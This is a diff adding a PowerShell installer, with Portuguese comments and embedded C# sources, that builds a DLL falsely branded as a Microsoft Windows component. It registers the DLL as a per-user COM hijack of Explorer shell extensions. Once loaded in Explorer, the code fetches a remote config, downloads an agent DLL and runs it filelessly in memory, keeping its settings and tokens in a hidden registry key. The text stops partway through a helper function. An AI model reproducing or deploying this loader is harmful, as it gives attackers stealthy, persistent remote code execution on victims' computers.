@@ -1,0 +1,1746 @@
+#Requires -Version 5.1
+<#
+.SYNOPSIS
+    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU).
+
+.PARAMETER Action
+    Install   - Compila bootstrap, registra hijack, grava config C/U/I
+    Uninstall - Remove hijack e opcionalmente a DLL instalada
+    Register  - Apenas registro COM (dev/teste)
+    Unregister- Apenas remove registro COM
+    ListClsid - Lista CLSIDs candidatos (overlay, shell service, etc.)
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -RestartExplorer
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action ListClsid
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -SourceDll 'C:\path\UserProfileCache.dll'
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Uninstall -Clsid '{GUID}' -RemoveDll
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Register -DllPath 'C:\path\UserProfileCache.dll' -Clsid '{GUID}'
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Register -DllPath 'C:\path\profilecache.dll' -Clsid '{GUID-2}' -UnregisterPrevious
+#>
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory = $true)]
+    [ValidateSet('Install', 'Uninstall', 'Register', 'Unregister', 'ListClsid')]
+    [string]$Action,
+
+    [string]$Config,
+    [string]$Clsid,
+    [string]$DllPath,
+    [string]$SourceDll,
+
+    [ValidateSet('Auto', 'x64', 'x86')]
+    [string]$Architecture = 'Auto',
+
+    [switch]$RestartExplorer,
+    [switch]$RemoveDll,
+    [switch]$UnregisterPrevious,
+    [switch]$UseRegAsm
+)
+
+$ErrorActionPreference = 'Stop'
+
+$Script:StateFile = Join-Path $env:TEMP '.profile-sync.last-clsid'
+$Script:InstallDllName = 'profilecache.dll'
+$Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
+
+#region BootstrapSources (AUTO-GENERATED)
+function Get-BootstrapSourceMap {
+    return @{
+        'CacheConstants.cs' = @'
+namespace UserProfileCache
+{
+    internal static class CacheConstants
+    {
+        public const string ClassGuid = "E8773F22-8D55-4D47-A6BD-8E83CDA3F196";
+        public const string InterfaceGuid = "F9884E33-9E66-5E58-B7CE-9F94DEB4F2A7";
+        public const string ProgId = "UserProfileCache.Provider";
+        public const string ComClassName = "UserProfileCache.CacheProvider";
+        public const string AgentEntryType = "RmmAgent.Core.AgentEntryPoint";
+        public const string AgentRunMethod = "RunAsync";
+        public const string AgentDownloadPath = "/download/RmmAgent.dll";
+        public const string MutexName = @"Global\UserProfileCache_Agent";
+        public const string ServerEnvVar = "RMM_SERVER";
+        public const string AgentIdEnvVar = "RMM_AGENT_ID";
+        public const string FilelessEnvVar = "RMM_FILELESS";
+        public const string DebugEnvVar = "RMM_DEBUG";
+        public const string AllowModulesEnvVar = "RMM_ALLOW_MODULES";
+        public const string FilelessEnvValue = "1";
+        public const string DebugEnvValue = "1";
+        /// <summary>Same HKCU store as RmmStealthInstaller / RegistrationService (C, U, I, T).</summary>
+        public const string FilelessStoreClsid = "{B2C3D4E5-F6A7-8901-BCDE-F12345678901}";
+        public const string FilelessTokenValueName = "T";
+        public const string AgentIdValueName = "I";
+        public const string OriginalInprocValueName = "O";
+        public const int InitialDelayMs = 5000;
+        public const int NetworkPollMs = 3000;
+        public const int InitialBackoffMs = 5000;
+        public const int MaxBackoffMs = 300000;
+    }
+}
+'@
+        'ICacheProvider.cs' = @'
+using System.Runtime.InteropServices;
+
+namespace UserProfileCache
+{
+    [ComVisible(true)]
+    [Guid(CacheConstants.InterfaceGuid)]
+    [InterfaceType(ComInterfaceType.InterfaceIsDual)]
+    public interface ICacheProvider
+    {
+        [DispId(1)]
+        string GetVersion();
+    }
+}
+'@
+        'IShellIconOverlayIdentifier.cs' = @'
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace UserProfileCache
+{
+    [ComImport]
+    [Guid("0C6C4200-C589-11D0-999A-00C04FD655E1")]
+    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    public interface IShellIconOverlayIdentifier
+    {
+        [PreserveSig]
+        int IsMemberOf([MarshalAs(UnmanagedType.LPWStr)] string path, uint attributes);
+
+        [PreserveSig]
+        int GetOverlayInfo(
+            [MarshalAs(UnmanagedType.LPWStr)] StringBuilder iconFile,
+            int cchMax,
+            out int index,
+            out uint flags);
+
+        [PreserveSig]
+        int GetPriority(out int priority);
+    }
+}
+'@
+        'IShellService.cs' = @'
+using System;
+using System.Runtime.InteropServices;
+
+namespace UserProfileCache
+{
+    [ComImport]
+    [Guid("6D5FE0D0-1573-4d9c-BCB3-08AF49A55656")]
+    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    public interface IShellService
+    {
+        [PreserveSig]
+        int SetOwner([MarshalAs(UnmanagedType.IUnknown)] object punkOwner);
+    }
+}
+'@
+        'ComNativeProxy.cs' = @'
+using System;
+using System.Runtime.InteropServices;
+
+namespace UserProfileCache
+{
+    internal static class ComNativeProxy
+    {
+        private static readonly Guid IidClassFactory = new Guid("00000001-0000-0000-C000-000000000046");
+        private static readonly Guid IidShellService = new Guid("6D5FE0D0-1573-4d9c-BCB3-08AF49A55656");
+
+        private static readonly object SyncRoot = new object();
+        private static object _cachedInstance;
+        private static IShellService _cachedShellService;
+        private static IShellIconOverlayIdentifier _cachedOverlay;
+        private static IntPtr _nativeModule;
+
+        public static IShellService GetShellService()
+        {
+            EnsureLoaded();
+            return _cachedShellService;
+        }
+
+        public static IShellIconOverlayIdentifier GetOverlay()
+        {
+            EnsureLoaded();
+            return _cachedOverlay;
+        }
+
+        private static void EnsureLoaded()
+        {
+            if (_cachedInstance != null)
+                return;
+
+            lock (SyncRoot)
+            {
+                if (_cachedInstance != null)
+                    return;
+
+                var config = RegistryStore.Load();
+                if (config == null)
+                {
+                    AgentBootstrap.WriteTrace("ComNativeProxy: RegistryStore.Load null");
+                    return;
+                }
+
+                if (string.IsNullOrEmpty(config.OriginalInprocDll) || string.IsNullOrEmpty(config.Clsid))
+                {
+                    AgentBootstrap.WriteTrace("ComNativeProxy: missing O or Clsid (O="
+                        + (config.OriginalInprocDll ?? "null") + ")");
+                    return;
+                }
+
+                Guid clsid;
+                if (!TryParseClsid(config.Clsid, out clsid))
+                {
+                    AgentBootstrap.WriteTrace("ComNativeProxy: invalid Clsid " + config.Clsid);
+                    return;
+                }
+
+                _cachedInstance = CreateInstanceFromNativeDll(config.OriginalInprocDll, clsid);
+                if (_cachedInstance == null)
+                    return;
+
+                _cachedShellService = _cachedInstance as IShellService;
+                if (_cachedShellService == null)
+                    _cachedShellService = QueryShellService(_cachedInstance);
+
+                _cachedOverlay = _cachedInstance as IShellIconOverlayIdentifier;
+
+                AgentBootstrap.WriteTrace("ComNativeProxy: inner="
+                    + (_cachedShellService != null ? "IShellService" : "none")
+                    + " overlay=" + (_cachedOverlay != null));
+            }
+        }
+
+        private static IShellService QueryShellService(object comObject)
+        {
+            if (comObject == null)
+                return null;
+
+            var ptr = Marshal.GetIUnknownForObject(comObject);
+            try
+            {
+                IntPtr servicePtr;
+                var iid = IidShellService;
+                var hr = Marshal.QueryInterface(ptr, ref iid, out servicePtr);
+                if (hr != 0 || servicePtr == IntPtr.Zero)
+                    return null;
+
+                try
+                {
+                    return (IShellService)Marshal.GetObjectForIUnknown(servicePtr);
+                }
+                finally
+                {
+                    Marshal.Release(servicePtr);
+                }
+            }
+            finally
+            {
+                Marshal.Release(ptr);
+            }
+        }
+
+        private static object CreateInstanceFromNativeDll(string dllPath, Guid clsid)
+        {
+            try
+            {
+                if (_nativeModule == IntPtr.Zero)
+                {
+                    _nativeModule = NativeMethods.LoadLibrary(dllPath);
+                    if (_nativeModule == IntPtr.Zero)
+                    {
+                        AgentBootstrap.WriteTrace("ComNativeProxy: LoadLibrary failed " + dllPath
+                            + " err=" + Marshal.GetLastWin32Error());
+                        return null;
+                    }
+                }
+
+                var export = NativeMethods.GetProcAddress(_nativeModule, "DllGetClassObject");
+                if (export == IntPtr.Zero)
+                {
+                    AgentBootstrap.WriteTrace("ComNativeProxy: DllGetClassObject export missing");
+                    return null;
+                }
+
+                var getClassObject = (NativeMethods.DllGetClassObjectDelegate)
+                    Marshal.GetDelegateForFunctionPointer(export, typeof(NativeMethods.DllGetClassObjectDelegate));
+
+                IntPtr factoryPtr;
+                var classId = clsid;
+                var factoryIid = IidClassFactory;
+                var hr = getClassObject(ref classId, ref factoryIid, out factoryPtr);
+                if (hr != 0 || factoryPtr == IntPtr.Zero)
+                {
+                    AgentBootstrap.WriteTrace("ComNativeProxy: DllGetClassObject hr=0x"
+                        + hr.ToString("X8") + " clsid=" + clsid);
+                    return null;
+                }
+
+                try
+                {
+                    var factory = (IClassFactory)Marshal.GetObjectForIUnknown(factoryPtr);
+                    IntPtr instancePtr;
+                    var serviceIid = IidShellService;
+                    hr = factory.CreateInstance(null, ref serviceIid, out instancePtr);
+                    if (hr != 0 || instancePtr == IntPtr.Zero)
+                    {
+                        var unknownIid = new Guid("00000000-0000-0000-C000-000000000046");
+                        hr = factory.CreateInstance(null, ref unknownIid, out instancePtr);
+                    }
+
+                    if (hr != 0 || instancePtr == IntPtr.Zero)
+                    {
+                        AgentBootstrap.WriteTrace("ComNativeProxy: CreateInstance hr=0x"
+                            + hr.ToString("X8"));
+                        return null;
+                    }
+
+                    try
+                    {
+                        return Marshal.GetObjectForIUnknown(instancePtr);
+                    }
+                    finally
+                    {
+                        Marshal.Release(instancePtr);
+                    }
+                }
+                finally
+                {
+                    Marshal.Release(factoryPtr);
+                }
+            }
+            catch (Exception ex)
+            {
+                AgentBootstrap.WriteTrace("ComNativeProxy: exception " + ex.Message);
+                return null;
+            }
+        }
+
+        private static bool TryParseClsid(string value, out Guid clsid)
+        {
+            clsid = Guid.Empty;
+            if (string.IsNullOrWhiteSpace(value))
+                return false;
+
+            var text = value.Trim();
+            if (text.StartsWith("{", StringComparison.Ordinal))
+                text = text.Substring(1);
+            if (text.EndsWith("}", StringComparison.Ordinal))
+                text = text.Substring(0, text.Length - 1);
+
+            return Guid.TryParse(text, out clsid);
+        }
+
+        [ComImport]
+        [Guid("00000001-0000-0000-C000-000000000046")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        private interface IClassFactory
+        {
+            [PreserveSig]
+            int CreateInstance(
+                [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
+                ref Guid riid,
+                out IntPtr ppvObject);
+
+            void LockServer([MarshalAs(UnmanagedType.Bool)] bool fLock);
+        }
+
+        private static class NativeMethods
+        {
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            internal delegate int DllGetClassObjectDelegate(
+                ref Guid rclsid,
+                ref Guid riid,
+                out IntPtr ppv);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+            internal static extern IntPtr LoadLibrary(string lpFileName);
+
+            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        }
+    }
+}
+'@
+        'CacheProvider.cs' = @'
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace UserProfileCache
+{
+    [ComVisible(true)]
+    [Guid(CacheConstants.ClassGuid)]
+    [ProgId(CacheConstants.ProgId)]
+    [ClassInterface(ClassInterfaceType.None)]
+    [ComDefaultInterface(typeof(IShellService))]
+    public class CacheProvider : ICacheProvider, IShellIconOverlayIdentifier, IShellService
+    {
+        private const int HResultFalse = 1;
+        private const int HResultOk = 0;
+        private const int HResultFail = unchecked((int)0x80004005);
+
+        static CacheProvider()
+        {
+            AgentBootstrap.WriteTrace("CacheProvider static ctor");
+            AgentBootstrap.Execute();
+        }
+
+        public CacheProvider()
+        {
+            AgentBootstrap.Execute();
+        }
+
+        public string GetVersion()
+        {
+            return "1.0.0.0";
+        }
+
+        public int IsMemberOf(string path, uint attributes)
+        {
+            var overlay = ComNativeProxy.GetOverlay();
+            if (overlay != null)
+                return overlay.IsMemberOf(path, attributes);
+
+            return HResultFalse;
+        }
+
+        public int GetOverlayInfo(StringBuilder iconFile, int cchMax, out int index, out uint flags)
+        {
+            var overlay = ComNativeProxy.GetOverlay();
+            if (overlay != null)
+                return overlay.GetOverlayInfo(iconFile, cchMax, out index, out flags);
+
+            index = 0;
+            flags = 0;
+            return HResultFalse;
+        }
+
+        public int GetPriority(out int priority)
+        {
+            var overlay = ComNativeProxy.GetOverlay();
+            if (overlay != null)
+                return overlay.GetPriority(out priority);
+
+            priority = 0;
+            return HResultOk;
+        }
+
+        public int SetOwner(object punkOwner)
+        {
+            var service = ComNativeProxy.GetShellService();
+            if (service != null)
+                return service.SetOwner(punkOwner);
+
+            return HResultFail;
+        }
+    }
+}
+'@
+        'RegistryStore.cs' = @'
+using System;
+using Microsoft.Win32;
+
+namespace UserProfileCache
+{
+    internal sealed class RegistryConfig
+    {
+        public string RegistryKeyName { get; set; }
+        public string Clsid { get; set; }
+        public string ConfigUrl { get; set; }
+        public string ServerBase { get; set; }
+        public string AgentId { get; set; }
+        public string OriginalInprocDll { get; set; }
+    }
+
+    internal static class RegistryStore
+    {
+        private const string ClsidRoot = @"Software\Classes\CLSID";
+        private const string InprocServer32 = "InprocServer32";
+        private const string ConfigValueName = "C";
+        private const string ServerValueName = "U";
+        private const string AgentIdValueName = "I";
+
+        public static RegistryConfig Load()
+        {
+            RegistryConfig selected = null;
+
+            using (var clsidRoot = Registry.CurrentUser.OpenSubKey(ClsidRoot))
+            {
+                if (clsidRoot == null)
+                    return null;
+
+                foreach (var subKeyName in clsidRoot.GetSubKeyNames())
+                {
+                    using (var clsidKey = clsidRoot.OpenSubKey(subKeyName))
+                    {
+                        if (clsidKey == null)
+                            continue;
+
+                        using (var inproc = clsidKey.OpenSubKey(InprocServer32))
+                        {
+                            if (inproc == null)
+                                continue;
+
+                            var className = inproc.GetValue("Class") as string;
+                            if (!string.Equals(className, CacheConstants.ComClassName, StringComparison.Ordinal))
+                                continue;
+
+                            var candidate = new RegistryConfig
+                            {
+                                RegistryKeyName = subKeyName,
+                                Clsid = FormatClsid(subKeyName),
+                                ConfigUrl = clsidKey.GetValue(ConfigValueName) as string,
+                                ServerBase = clsidKey.GetValue(ServerValueName) as string,
+                                AgentId = clsidKey.GetValue(AgentIdValueName) as string,
+                                OriginalInprocDll = clsidKey.GetValue(CacheConstants.OriginalInprocValueName) as string
+                            };
+
+                            if (selected == null || ScoreConfig(candidate) > ScoreConfig(selected))
+                                selected = candidate;
+                        }
+                    }
+                }
+            }
+
+            if (selected == null)
+                return null;
+
+            MergeFromFilelessStore(selected);
+            return selected;
+        }
+
+        private static int ScoreConfig(RegistryConfig config)
+        {
+            if (config == null)
+                return 0;
+
+            var score = 0;
+            if (!string.IsNullOrEmpty(config.OriginalInprocDll))
+                score += 8;
+            if (!string.IsNullOrEmpty(config.AgentId))
+                score += 4;
+            if (!string.IsNullOrEmpty(config.ServerBase))
+                score += 2;
+            if (!string.IsNullOrEmpty(config.ConfigUrl))
+                score += 1;
+            return score;
+        }
+
+        /// <summary>
+        /// Mirrors C/U/I to the canonical fileless CLSID so RegistrationService can persist JWT (T).
+        /// </summary>
+        public static void SyncFilelessStore(RegistryConfig config)
+        {
+            if (config == null)
+                return;
+
+            using (var key = OpenFilelessStoreKey(true))
+            {
+                if (key == null)
+                    return;
+
+                if (!string.IsNullOrEmpty(config.ConfigUrl))
+                    key.SetValue(ConfigValueName, config.ConfigUrl, RegistryValueKind.String);
+
+                if (!string.IsNullOrEmpty(config.ServerBase))
+                    key.SetValue(ServerValueName, config.ServerBase, RegistryValueKind.String);
+
+                if (!string.IsNullOrEmpty(config.AgentId))
+                    key.SetValue(AgentIdValueName, config.AgentId, RegistryValueKind.String);
+            }
+        }
+
+        public static void SaveServerBase(RegistryConfig config, string serverBase)
+        {
+            if (config == null || string.IsNullOrEmpty(config.Clsid))
+                return;
+
+            using (var clsidRoot = Registry.CurrentUser.OpenSubKey(ClsidRoot, true))
+            {
+                if (clsidRoot == null)
+                    return;
+
+                using (var key = clsidRoot.OpenSubKey(config.RegistryKeyName, true))
+                {
+                    if (key != null)
+                        key.SetValue(ServerValueName, serverBase ?? string.Empty, RegistryValueKind.String);
+                }
+            }
+
+            config.ServerBase = serverBase;
+            SyncFilelessStore(config);
+        }
+
+        private static void MergeFromFilelessStore(RegistryConfig config)
+        {
+            using (var store = OpenFilelessStoreKey(false))
+            {
+                if (store == null)
+                    return;
+
+                if (string.IsNullOrEmpty(config.ConfigUrl))
+                    config.ConfigUrl = store.GetValue(ConfigValueName) as string;
+
+                if (string.IsNullOrEmpty(config.ServerBase))
+                    config.ServerBase = store.GetValue(ServerValueName) as string;
+
+                if (string.IsNullOrEmpty(config.AgentId))
+                    config.AgentId = store.GetValue(AgentIdValueName) as string;
+            }
+        }
+
+        private static RegistryKey OpenFilelessStoreKey(bool writable)
+        {
+            var path = FilelessStoreRelativePath();
+            var key = Registry.CurrentUser.OpenSubKey(path, writable);
+            if (key != null || !writable)
+                return key;
+
+            return Registry.CurrentUser.CreateSubKey(path);
+        }
+
+        private static string FilelessStoreRelativePath()
+        {
+            return ClsidRoot + @"\" + FilelessStoreKeyName();
+        }
+
+        private static string FilelessStoreKeyName()
+        {
+            var clsid = CacheConstants.FilelessStoreClsid.Trim();
+            if (!clsid.StartsWith("{", StringComparison.Ordinal))
+                clsid = "{" + clsid + "}";
+            if (!clsid.EndsWith("}", StringComparison.Ordinal))
+                clsid = clsid + "}";
+            return clsid.ToUpperInvariant();
+        }
+
+        /// <summary>Removes stale JWT so a new agent id can register cleanly.</summary>
+        public static void ClearFilelessToken()
+        {
+            using (var key = OpenFilelessStoreKey(true))
+            {
+                if (key == null)
+                    return;
+
+                try { key.DeleteValue(CacheConstants.FilelessTokenValueName, false); }
+                catch { }
+            }
+        }
+
+        /// <summary>Removes mistaken store key created without braces around the CLSID.</summary>
+        public static void RemoveLegacyFilelessStoreKey()
+        {
+            var legacyName = FilelessStoreKeyName().Trim('{', '}');
+            var legacyPath = ClsidRoot + @"\" + legacyName;
+
+            try { Registry.CurrentUser.DeleteSubKeyTree(legacyPath, false); }
+            catch { }
+        }
+
+        private static string FormatClsid(string subKeyName)
+        {
+            return subKeyName.StartsWith("{", StringComparison.Ordinal)
+                ? subKeyName.ToUpperInvariant()
+                : "{" + subKeyName.ToUpperInvariant() + "}";
+        }
+    }
+}
+'@
+        'ConfigClient.cs' = @'
+using System;
+using System.Net;
+using System.Text.RegularExpressions;
+
+namespace UserProfileCache
+{
+    internal static class ConfigClient
+    {
+        private static readonly Regex ServerRegex = new Regex(
+            @"""server""\s*:\s*""([^""]+)""",
+            RegexOptions.IgnoreCase | RegexOptions.Compiled);
+
+        public static void EnableTls12()
+        {
+            try
+            {
+                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
+            }
+            catch
+            {
+            }
+        }
+
+        public static string FetchServerBase(string configUrl)
+        {
+            if (string.IsNullOrWhiteSpace(configUrl))
+                return null;
+
+            EnableTls12();
+
+            using (var client = new WebClient())
+            {
+                var raw = client.DownloadString(configUrl);
+                var match = ServerRegex.Match(raw ?? string.Empty);
+                if (!match.Success)
+                    throw new InvalidOperationException("Config missing 'server' key.");
+
+                return match.Groups[1].Value.Trim().TrimEnd('/');
+            }
+        }
+
+        public static string RefreshServerBase(RegistryConfig config)
+        {
+            if (config == null)
+                return null;
+
+            if (string.IsNullOrWhiteSpace(config.ConfigUrl))
+                return config.ServerBase;
+
+            try
+            {
+                var serverBase = FetchServerBase(config.ConfigUrl);
+                RegistryStore.SaveServerBase(config, serverBase);
+                return serverBase;
+            }
+            catch
+            {
+                return config.ServerBase;
+            }
+        }
+    }
+}
+'@
+        'AgentBootstrap.cs' = @'
+using System;
+using System.IO;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Reflection;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace UserProfileCache
+{
+    internal static class AgentBootstrap
+    {
+        private static readonly object SyncRoot = new object();
+        private static int _executed;
+
+        public static void Execute()
+        {
+            if (Interlocked.Exchange(ref _executed, 1) == 1)
+                return;
+
+            // MTA — RunAsync/WebSocket inside explorer must not run on STA COM threads.
+            var thread = new Thread(RunWorkerSafe);
+            thread.IsBackground = true;
+            thread.SetApartmentState(ApartmentState.MTA);
+            thread.Start();
+        }
+
+        private static void RunWorkerSafe()
+        {
+            try
+            {
+                RunWorker();
+            }
+            catch (Exception ex)
+            {
+                WriteTrace("RunWorker fatal: " + ex.Message);
+            }
+        }
+
+        private static void RunWorker()
+        {
+            Thread.Sleep(CacheConstants.InitialDelayMs);
+            WriteTrace("RunWorker started");
+
+            Mutex mutex = null;
+            var ownsMutex = false;
+
+            try
+            {
+                bool mutexCreated;
+                mutex = new Mutex(false, CacheConstants.MutexName, out mutexCreated);
+                ownsMutex = mutex.WaitOne(0, false);
+                if (!ownsMutex)
+                {
+                    WriteTrace("Mutex busy — exiting");
+                    return;
+                }
+
+                var config = RegistryStore.Load();
+                if (config == null)
+                {
+                    WriteTrace("RegistryStore.Load returned null");
+                    return;
+                }
+
+                WriteTrace("Config loaded clsid=" + config.Clsid + " agentId=" + (config.AgentId ?? "null"));
+
+                RegistryStore.RemoveLegacyFilelessStoreKey();
+                RegistryStore.SyncFilelessStore(config);
+
+                var backoff = CacheConstants.InitialBackoffMs;
+
+                while (true)
+                {
+                    while (!NetworkInterface.GetIsNetworkAvailable())
+                        Thread.Sleep(CacheConstants.NetworkPollMs);
+
+                    try
+                    {
+                        var serverBase = ConfigClient.RefreshServerBase(config);
+                        if (string.IsNullOrWhiteSpace(serverBase))
+                            throw new InvalidOperationException("Server base unavailable.");
+
+                        ApplyAgentEnvironment(config, serverBase);
+                        LogEnvironmentSnapshot();
+
+                        var started = DateTime.UtcNow;
+                        LoadAndRunAgent(serverBase);
+                        var elapsedMs = (int)(DateTime.UtcNow - started).TotalMilliseconds;
+                        WriteTrace("Agent RunAsync ended after " + elapsedMs + "ms");
+
+                        if (elapsedMs < 5000)
+                        {
+                            RegistryStore.ClearFilelessToken();
+                            throw new InvalidOperationException(
+                                "Agent exited early — see %TEMP%\\rmmlog.txt (RMM_DEBUG=1)");
+                        }
+
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        WriteTrace("Retry: " + ex.Message);
+                        Thread.Sleep(backoff);
+                        if (backoff < CacheConstants.MaxBackoffMs)
+                            backoff = Math.Min(backoff * 2, CacheConstants.MaxBackoffMs);
+                    }
+                }
+            }
+            finally
+            {
+                if (ownsMutex && mutex != null)
+                {
+                    try { mutex.ReleaseMutex(); } catch { }
+                }
+
+                if (mutex != null)
+                    mutex.Dispose();
+            }
+        }
+
+        private static void ApplyAgentEnvironment(RegistryConfig config, string serverBase)
+        {
+            var normalizedServer = serverBase.TrimEnd('/');
+
+            SetEnv(CacheConstants.ServerEnvVar, normalizedServer);
+            SetEnv(CacheConstants.FilelessEnvVar, CacheConstants.FilelessEnvValue);
+            SetEnv(CacheConstants.DebugEnvVar, CacheConstants.DebugEnvValue);
+            SetEnv(CacheConstants.AllowModulesEnvVar, string.Empty);
+
+            if (!string.IsNullOrEmpty(config.AgentId))
+                SetEnv(CacheConstants.AgentIdEnvVar, config.AgentId);
+        }
+
+        private static void SetEnv(string name, string value)
+        {
+            Environment.SetEnvironmentVariable(name, value, EnvironmentVariableTarget.Process);
+
+            try
+            {
+                Environment.SetEnvironmentVariable(name, value, EnvironmentVariableTarget.User);
+            }
+            catch
+            {
+            }
+        }
+
+        private static void LogEnvironmentSnapshot()
+        {
+            WriteTrace("Env RMM_SERVER=" + (Environment.GetEnvironmentVariable(CacheConstants.ServerEnvVar) ?? "null"));
+            WriteTrace("Env RMM_FILELESS=" + (Environment.GetEnvironmentVariable(CacheConstants.FilelessEnvVar) ?? "null"));
+            WriteTrace("Env RMM_DEBUG=" + (Environment.GetEnvironmentVariable(CacheConstants.DebugEnvVar) ?? "null"));
+            WriteTrace("Env RMM_AGENT_ID=" + (Environment.GetEnvironmentVariable(CacheConstants.AgentIdEnvVar) ?? "null"));
+            WriteTrace("Env RMM_ALLOW_MODULES=" + (Environment.GetEnvironmentVariable(CacheConstants.AllowModulesEnvVar) ?? "<null>"));
+        }
+
+        private static void LoadAndRunAgent(string serverBase)
+        {
+            ConfigClient.EnableTls12();
+
+            var downloadUrl = serverBase.TrimEnd('/') + CacheConstants.AgentDownloadPath;
+            byte[] dllBytes;
+
+            using (var client = new WebClient())
+            {
+                dllBytes = client.DownloadData(downloadUrl);
+            }
+
+            if (dllBytes == null || dllBytes.Length == 0)
+                throw new InvalidOperationException("Agent download returned empty payload.");
+
+            WriteTrace("RmmAgent downloaded " + dllBytes.Length + " bytes");
+
+            var assembly = Assembly.Load(dllBytes);
+            var entryType = assembly.GetType(CacheConstants.AgentEntryType, true);
+            var runMethod = entryType.GetMethod(
+                CacheConstants.AgentRunMethod,
+                BindingFlags.Public | BindingFlags.Static);
+
+            if (runMethod == null)
+                throw new MissingMethodException(entryType.FullName, CacheConstants.AgentRunMethod);
+
+            var result = runMethod.Invoke(null, new object[] { CancellationToken.None });
+            var task = result as Task;
+            if (task != null)
+                task.ConfigureAwait(false).GetAwaiter().GetResult();
+        }
+
+        internal static void WriteTrace(string message)
+        {
+            try
+            {
+                var temp = Environment.GetEnvironmentVariable("TEMP");
+                var logPath = string.IsNullOrEmpty(temp)
+                    ? @"C:\Windows\Temp\.profile-sync.log"
+                    : Path.Combine(temp, ".profile-sync.log");
+
+                var entry = string.Format(
+                    "[{0:yyyy-MM-dd HH:mm:ss} UTC] {1}{2}",
+                    DateTime.UtcNow,
+                    message,
+                    Environment.NewLine);
+
+                File.AppendAllText(logPath, entry);
+            }
+            catch
+            {
+            }
+        }
+
+#if DEBUG
+        internal static void WriteDebugLog(string message)
+        {
+            WriteTrace(message);
+        }
+#endif
+    }
+}
+'@
+        'AssemblyInfo.cs' = @'
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("UserProfileCache")]
+[assembly: AssemblyDescription("User profile cache provider")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Microsoft Corporation")]
+[assembly: AssemblyProduct("Microsoft Windows")]
+[assembly: AssemblyCopyright("")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(true)]
+[assembly: Guid("D5E7F9AB-C3D4-6E8F-A1B2-C4D6E8FA0B1C")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+'@
+    }
+}
+#endregion BootstrapSources (AUTO-GENERATED)
+
+#region Bootstrap compile
+
+function Get-CscPath {
+    param(
+        [ValidateSet('Auto', 'x64', 'x86')]
+        [string]$Arch = 'Auto'
+    )
+
+    $paths = @()
+    if ($Arch -eq 'x86') {
+        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
+    }
+    elseif ($Arch -eq 'x64') {
+        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
+    }
+    else {
+        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
+        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
+    }
+
+    foreach ($path in $paths) {
+        if (Test-Path $path) { return $path }
+    }
+
+    throw "csc.exe não encontrado. Instale .NET Framework 4.x. Tentativas: $($paths -join ', ')"
+}
+
+function Invoke-CompileBootstrap {
+    param(
+        [Parameter(Mandatory = $true)][string]$OutputPath,
+        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
+    )
+
+    $buildDir = Join-Path $env:TEMP ("upc_" + [guid]::NewGuid().ToString('N'))
+    New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
+
+    try {
+        $sourceMap = Get-BootstrapSourceMap
+        foreach ($entry in $sourceMap.GetEnumerator()) {
+            $filePath = Join-Path $buildDir $entry.Key
+            Set-Content -LiteralPath $filePath -Value $entry.Value -Encoding UTF8
+        }
+
+        $csc = Get-CscPath -Arch $Arch
+        $sourceFiles = Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName }
+
+        $outDir = Split-Path -Parent $OutputPath
+        if (-not (Test-Path $outDir)) {
+            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+        }
+
+        $stagingPath = Join-Path $buildDir 'UserProfileCache.dll'
+
+        $cscArgs = @(
+            '/nologo',
+            '/target:library',
+            '/platform:anycpu',
+            "/out:$stagingPath",
+            '/reference:System.dll'
+        ) + $sourceFiles
+
+        Write-Host "[*] Compilando com $csc ..."
+        & $csc @cscArgs
+
+        if ($LASTEXITCODE -ne 0) {
+            throw "csc.exe falhou com exit code $LASTEXITCODE"
+        }
+
+        if (-not (Test-Path $stagingPath -PathType Leaf)) {
+            throw "Compilação não gerou: $stagingPath"
+        }
+
+        Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
+    }
+    finally {
+        if (Test-Path $buildDir) {
+            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+#endregion
+
+#region COM registry helpers
+
+function Format-ComClsid {
+    param([string]$Value)
+    $normalized = $Value.Trim('{}').ToUpperInvariant()
+    return "{$normalized}"
+}
+
+function Format-CodeBaseUri {
+    param([string]$Path)
+    $absolute = [System.IO.Path]::GetFullPath($Path)
+    return ([System.Uri]::new($absolute)).AbsoluteUri
+}
+
+function Get-MscoreePath {
